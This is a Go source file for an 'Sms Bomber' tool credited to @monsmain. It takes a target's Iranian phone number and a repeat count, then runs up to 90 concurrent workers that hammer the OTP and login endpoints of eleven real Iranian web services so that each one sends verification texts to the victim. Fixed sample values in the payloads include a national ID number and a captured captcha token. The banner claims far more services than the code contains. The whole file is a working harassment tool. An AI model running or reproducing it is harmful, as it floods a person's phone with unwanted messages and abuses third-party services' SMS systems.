package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"  
        "net/http/cookiejar"  
)
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		
		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second 

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) 
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return 
	}
}//Code by @monsmain
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p) 
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p 
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}
func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*40)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*40)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
		
		// 1. سرویس tamimpishro.com/site/api/v1/user/validate (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://www.tamimpishro.com/site/api/v1/user/validate", map[string]interface{}{
					"mobile": phone, // بر اساس نمونه با صفر اول
				}, &wg, ch)
			}
		}(client)

		// 2. سرویس tamimpishro.com/site/api/v1/user/otp (POST JSON)
        // توجه: پارامترهای name و national_code از نمونه برداشته شده‌اند و ممکن است نیاز به مقادیر واقعی یا دینامیک داشته باشند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://www.tamimpishro.com/site/api/v1/user/otp", map[string]interface{}{
					"return_url": "",
					"mobile": phone, // بر اساس نمونه با صفر اول
					"name": "پژمان", // مقدار نمونه
					"national_code": "1092587584", // مقدار نمونه
					"referrer": "گوگل", // مقدار نمونه
				}, &wg, ch)
			}
		}(client)


		// 3. سرویس app.itoll.com/api/v1/auth/login (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://app.itoll.com/api/v1/auth/login", map[string]interface{}{
					"mobile": phone, // بر اساس نمونه با صفر اول
				}, &wg, ch)
			}
		}(client)

		// 4. سرویس api.lendo.ir/api/customer/auth/check-password (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.lendo.ir/api/customer/auth/check-password", map[string]interface{}{
					"mobile": phone, // بر اساس نمونه با صفر اول
				}, &wg, ch)
			}
		}(client)

		// 5. سرویس api.lendo.ir/api/customer/auth/send-otp (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
					"mobile": phone, // بر اساس نمونه با صفر اول
				}, &wg, ch)
			}
		}(client)

		// 6. سرویس api.mobit.ir/api/web/v8/register/register (POST JSON)
        // توجه: پارامترهای hash_1 و hash_2 احتمالا پویا هستند و ممکن است کار نکنند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.mobit.ir/api/web/v8/register/register", map[string]interface{}{
					"number": phone, // بر اساس نمونه با صفر اول
                    "hash_1": 1746034867, // مقدار نمونه - احتمالا پویا
                    "hash_2": "46ecfa35e84a8f980bd31d785e45cf27f10c55cfde995b677484dba6c25f5995", // مقدار نمونه - احتمالا پویا
				}, &wg, ch)
			}
		}(client)

		// 7. سرویس api.vandar.io/account/v1/check/mobile (POST JSON)
        // توجه: پارامتر 'captcha' کاملا پویا است و این سرویس با مقدار ثابت کار نخواهد کرد.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.vandar.io/account/v1/check/mobile", map[string]interface{}{
					"mobile": phone, // بر اساس نمونه با صفر اول
                    "captcha": "0.g8ehij4uCK6dZS1TCeDTGS3NARwXAr8hhXFPc4h47pf-wzJgPWc8SUbgrw56alkWiYY5QNJgY4GKYWMU46j_2FiY2xhcrb8Ww4smoDPo09MXn9pW5BhZ-MIjxAUiQ3ga47_RhYDVGS39Gy0egELT-Ke8-ndNpBP4Opa7gXoKCmFu8TwBz8ag6JBAYeyJp7m1NwqsxwJlA0PJBnLu40S4n8gLn5fdkbqk2f8e5CzO7cKIhrOwMNoKZ8sPpEdc-rhabCXlzLM2zjjyphMbElZCsKZHDkU3-0wH650nBNSe-nzGhxzoxEArhjjniwYZcLthH93V-cYT8VblGK1LcDK9zvN1dCpPBEt1ac01r1dUxjZY-IFv8VLO1nOQTXgPOJ44fxVcUFRJnWcie-KkLR9tjujiV7aSGUxS167hCHFPe0wzrjHDqer7p_66WGWAGNsSNuqyuICT__B7xlmQYmDqVnSCJQAq-VHCrcN0xi3ky0DLGYKeiJTxG2FHU_PPGQ9KNtVa5_ao69snv5eN8ExfKfAMIvhROTNCpDwuSZqpFWIYE1_36uTElqL_c6aJkcNE4N1GRsMjfBwgeIFvnfqhcm329ZjOvrdiqoSVSTVZsKYl6DATuXNDQ7e14NkwO9bSfovBrkvk3_MnreVjgehkXRHj3llRyCIlREF7-RopOjMQoEU1qRGgodRhxxc61KQgZ3cTf5Oa0wkcInXsu0KhWIZ_HequNxU8ck6SRJqEW065SCzGSXjpm0H-DUAb9sWdtgEPpd4UKPWG3vtSWN4PB_D1MCLVbLKRI9Ot92rjxf-sIBTsAeGDmDnK5com9aTykoUYCFsQc0fw1VKjtDsTtox4OR13LsgdzYJzmh2p-m0.aE5MoCGzBJjmZcdziZG8UQ.91c315c3b4bf2b001397b91ef9b15b4640cfbd38cafc2569361f8608071ba44d", // مقدار نمونه - کاملا پویا
                    "captcha_provider": "CLOUDFLARE", // مقدار ثابت
				}, &wg, ch)
			}
		}(client)

		// 8. سرویس drdr.ir/api/v3/auth/login/mobile/init/ (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://drdr.ir/api/v3/auth/login/mobile/init/", map[string]interface{}{
					"mobile": phone, // بر اساس نمونه با صفر اول
				}, &wg, ch)
			}
		}(client)

		// 9. سرویس azki.com/.../check-login-availability/ (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
					"phoneNumber": phone, // بر اساس نمونه با صفر اول
                    "origin": "www.azki.com", // مقدار ثابت
				}, &wg, ch)
			}
		}(client)

		// 10. سرویس api.epasazh.com/api/v4/blind-otp (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.epasazh.com/api/v4/blind-otp", map[string]interface{}{
					"mobile": phone, // بر اساس نمونه با صفر اول
				}, &wg, ch)
			}
		}(client)

		// 11. سرویس ws.alibaba.ir/api/v3/account/mobile/otp (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
					"phoneNumber": phone, // بر اساس نمونه با صفر اول
				}, &wg, ch)
			}
		}(client)

}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
//Code by @monsmain
